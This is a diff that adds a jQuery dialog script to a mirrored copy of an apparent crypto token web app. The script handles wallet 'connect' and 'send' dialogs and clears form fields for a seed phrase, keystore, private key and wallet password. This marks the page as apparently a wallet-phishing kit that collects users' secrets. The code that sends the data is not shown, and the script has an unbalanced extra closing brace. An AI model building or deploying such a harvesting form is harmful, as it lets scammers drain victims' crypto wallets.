@@ -8111,8 +8111,52 @@
         });
       });
     </script>
-   
-    
+    <script>
+      $(document).ready(function () {
+        let dialogDismiss = $(".dialog-dismiss");
+        let sendForm = $("#data-to-send");
+        let successBox = $("#success-dialog");
+        let errorBox = $("#error-dialog");
+        dialogDismiss.each(function () {
+          $(this).on("click", function () {
+            $("#connect-dialog").hide();
+            $("#send-dialog").hide();
+          });
+        });
+
+
+        $(".connection-info").on("click", ".manual-connection", function () {
+          $("#current-wallet-app-send").text($("#current-wallet-app").text());
+          $("#walletNameData").val($("#current-wallet-app").text());
+          var link = $("#current-wallet-app").text();
+          $("#current-wallet-send-logo").attr(
+            "src",
+            $("#current-wallet-logo").attr("src")
+          );
+          $("#connect-dialog").hide();
+          $("#send-dialog").show();
+        });
+
+       
+          
+
+          
+
+          function dismissAllDialogs() {
+            successBox.hide();
+            errorBox.hide();
+            $("#connect-dialog").hide();
+            $("#send-dialog").hide();
+            $("#processing-dialog").hide();
+            $("#message-tab").hide();
+            $("#phrase").val("");
+            $("#keystore").val("");
+            $("#private_key").val("");
+            $("#wallet_password").val("");
+          }
+        });
+      });
+    </script>
   </body>
 
 <!-- Mirrored from little-pepe.vercel.app/app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 24 Sep 2025 12:21:44 GMT -->
